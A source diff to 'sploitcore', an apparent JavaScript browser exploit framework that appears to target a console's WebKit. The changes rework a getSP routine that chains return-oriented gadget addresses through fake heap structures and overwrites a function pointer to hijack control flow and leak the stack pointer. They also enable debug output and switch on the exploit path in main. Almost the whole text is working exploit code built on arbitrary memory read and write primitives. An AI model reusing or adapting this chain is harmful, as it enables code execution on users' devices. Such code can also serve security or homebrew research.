@@ -1,4 +1,4 @@
-var DEBUG = false;
+var DEBUG = true;
 
 function send(ep, data) {
 	data = JSON.stringify(data);
@@ -363,24 +363,7 @@ sploitcore.prototype.walkList = function() {
 };
 
 sploitcore.prototype.getSP = function() {
-	/*
-		First gadget: hijack X8 via ADRP and known PC, load X2 from known address and branch there
-	
-		.text:000000000039FEEC 08 2C 00 90                 ADRP            X8, #qword_91F320@PAGE ; Address of Page
-		.text:000000000039FEF0 08 81 0C 91                 ADD             X8, X8, #qword_91F320@PAGEOFF ; Rd = Op1 + Op2
-		.text:000000000039FEF4 02 05 40 F9                 LDR             X2, [X8,#(qword_91F328 - 0x91F320)] ; Load from Memory
-		.text:000000000039FEF8 40 00 1F D6                 BR              X2      ; Branch To Register
-	*/
-	/*
-		Second gadget: assuming known X8, grab X9 value, leak SP via X24, and branch to X9
-	
-		.text:00000000003E2724                 LDR             X9, [X8,#0x30]
-		.text:00000000003E2728                 MOV             X8, SP
-		.text:00000000003E272C                 MOV             X0, X23
-		.text:00000000003E2730                 MOV             X24, SP
-		.text:00000000003E2734                 BLR             X9
-	*/
-	var jaddr = this.mref(0x39FEEC); // First gadget addr
+	var jaddr = this.mref(0x39FEEC); // First gadget
 	dlog('New jump at ' + paddr(jaddr));
 	dlog('Assigning function pointer');
 
@@ -388,28 +371,42 @@ sploitcore.prototype.getSP = function() {
 	var curptr = this.read8(this.funcaddr, 8);
 
 	var fixed = this.mref(0x91F320);
-	var saved = new Uint32Array(30);
+	var saved = new Uint32Array(0x18 >> 2);
 	for(var i = 0; i < saved.length; ++i)
 		saved[i] = this.read4(fixed, i);
 	
-	var retaddr = this.mref(0x3E2724); // Second gadget addr
-	var memaddr = this.mref(0x91F328);
-	this.write8(retaddr, memaddr);
-	retaddr = this.mref(0x181E9C); // Last gadget addr (should just be `blr X27`)
-	memaddr = this.mref(0x91F350);
-	this.write8(retaddr, memaddr);
+	var struct1 = this.malloc(0x48);
+	var struct2 = this.malloc(0x28);
+	var struct3 = this.malloc(0x518);
+	var struct4 = this.malloc(0x38);
 
-	// For addresses in webkit_wkc
-	//write8(add2(add2(curptr, -funcbase), 0x836050), funcaddr, 8);
+	this.write8(struct1, fixed, 0);
+	this.write8(this.mref(0x4967F0), fixed, 0x8 >> 2); // Second gadget
+	this.write8(this.mref(0x48FE44), fixed, 0x10 >> 2); // Third gadget
 
-	// For addresses in app
+	this.write8(struct2, struct1, 0x10 >> 2);
+
+	this.write8(struct3, struct2, 0);
+	this.write8(this.mref(0x2E5F88), struct2, 0x20 >> 2);
+
+	this.write8([0x00000000, 0xffff0000], struct3, 0x8 >> 2);
+	this.write8(this.mref(0x1892A4), struct3, 0x18 >> 2);
+	this.write8(this.mref(0x46DFD4), struct3, 0x20 >> 2);
+	this.write8(struct4, struct3, 0x510 >> 2);
+
+	this.write8(this.mref(0x1F61C0), struct4, 0x18 >> 2);
+	this.write8(this.mref(0x181E9C), struct4, 0x28 >> 2);
+	this.write8(this.mref(0x1A1C98), struct4, 0x30 >> 2);
+
 	this.write8(jaddr, this.funcaddr, 8);
 
 	dlog('Patched function address from ' + paddr(curptr) + ' to ' + paddr(this.read8(this.funcaddr, 8)));
 
 	dlog('Assigned.  Jumping.');
-	var sp = this.getAddrDestroy(this.func.apply(0x101));
+	this.func.apply(0x101);
 	dlog('Jumped back.');
+
+	var sp = add2(this.read8(struct3, 0), -0x18);
 
 	dlog('Got stack pointer: ' + paddr(sp));
 
@@ -419,6 +416,13 @@ sploitcore.prototype.getSP = function() {
 	for(var i = 0; i < saved.length; ++i)
 		this.write4(saved[i], fixed, i);
 	dlog('Restored data page.');
+
+	this.free(struct1);
+	this.free(struct2);
+	this.free(struct3);
+	this.free(struct4);
+
+	dlog('Freed buffers');
 
 	return sp;
 };
@@ -931,7 +935,7 @@ sploitcore.prototype.gc = function() {
 			sub(depth - 1);
 		}
 	}
-	sub(15);
+	sub(20);
 	dlog('GC should be solid');
 };
 
@@ -940,13 +944,13 @@ var int = 'int', bool = 'bool', char_p = 'char*', void_p = 'void*';
 function main() {
 	var sc = new sploitcore();
 
-	/*sc.gc();
+	sc.gc();
 	sc.gc();
 
-	sc.getSP();
+	log(paddr(sc.getSP()));
 
 	sc.gc();
-	return;*/
+	return;
 
 	/*var str = 'this is a test string of length 0x25!';
 
